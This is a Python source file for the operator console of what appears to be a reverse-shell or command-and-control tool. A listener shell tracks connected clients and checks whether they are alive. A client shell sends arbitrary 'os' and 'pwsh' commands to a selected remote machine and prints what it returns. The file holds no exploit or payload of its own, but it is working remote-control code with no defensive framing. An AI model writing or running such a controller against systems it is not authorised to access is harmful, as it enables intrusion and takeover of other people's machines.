import sys
import socket
from shell_ui.style import Style


class ListenerShell(Style):
    """
    Handles all the user input for the listener shell.
    """

    def __init__(self, listener_socket):
        self.listenerSocket = listener_socket

    def run(self):
        while True:
            try:
                command = input('listener > ')
            except KeyboardInterrupt:
                print()
                break
            self.execute(command)

    def execute(self, command):
        if command == '':
            pass

        elif command == 'exit':
            sys.exit(0)

        elif command == 'help':
            self.posSysMsg('Listener Shell Commands:\n')
            print('help   - shows this help menu')
            print('list   - lists all client connections and checks if they are active')
            print('select - start client shell by index')
            print('^C     - exits the listener')

        elif command == 'list':
            index = 0

            for client in self.listenerSocket.getClients():
                try:
                    client.send('ACTIVE', [])
                    data, cwd = client.receive(1024)
                    if data == -1 and cwd == -1:
                        self.negSysMsg('Client {} inactive'.format(index))
                except socket.error:
                    self.negSysMsg('Client {} inactive'.format(index))
                else:
                    if data == 'ACTIVE':
                        self.posSysMsg('Client {} active'.format(index))
                    else:
                        self.negSysMsg('Client {} inactive'.format(index))
                index += 1

        elif command[:6] == 'select':
            index = int(command[7])
            client = self.listenerSocket.getClient(index)
            shell = ClientShell(client)
            shell.run()

        elif command[:3] == 'del':
            index = int(command[4])
            self.listenerSocket.delClient(index)

        else:
            self.negSysMsg('Command unknown')


class ClientShell(Style):
    BUFFER_SIZE = 4096

    def __init__(self, client):
        self.client = client

    def run(self):
        """
        The core part of ther listener shell.
        Runs endlessly unless an exception occurs or exit is entered.
        """
        self.posSysMsg('Starting shell with client')
        # initialize cwd for shell
        self.client.send('', '')
        output, cwd = self.client.receive(1024)
        if output == -1 and cwd == -1: return
        while True:
            try:
                command = input('{} > '.format(cwd))
            except KeyboardInterrupt:
                print()
                continue
            # determine if output needs to be send to not interrupt socket cycle
            execution_status = self.execute(command)
            # nothing needs to be send
            if execution_status == -1:
                continue
            # socket needs to be used to receive command output
            elif execution_status == 0:
                # receive the client output
                output, cwd = self.client.receive(self.BUFFER_SIZE)
                if output == -1 and cwd == -1: break
                print(output)
            # exit client shell
            elif execution_status == -2:
                break
            else:
                raise ValueError('Output of self.execute should be 0, -1 or -2.')

    def execute(self, command) -> int:
        """
        Executes the user input from the client shell.
        Returns 0 if there is expected output that should be received from the socket,
        returns -1 if there is no expected output and -2 to exit the shell.
        """
        if command == 'help':
            self.posSysMsg('Client Shell Commands:\n')
            print('help           - shows this help menu')
            print('os <command>   - executes <command> on the remote system')
            print('pwsh <command> - executes <command> on the remote system in powershell')
            print('^C             - exits the listener')
            return -1
        elif command == '':
            return -1
        elif command[:2] == 'os':
            self.client.send('EXECUTE', [command[3:]])
        elif command[:4] == 'pwsh':
            self.client.send('POWERSHELL', [command[5:]])
        elif command == 'exit':
            self.posSysMsg('Exiting client shell')
            self.client.send('EXIT', [])
            return -2
        else:
            self.negSysMsg('Command not recognized')
            return -1
        return 0
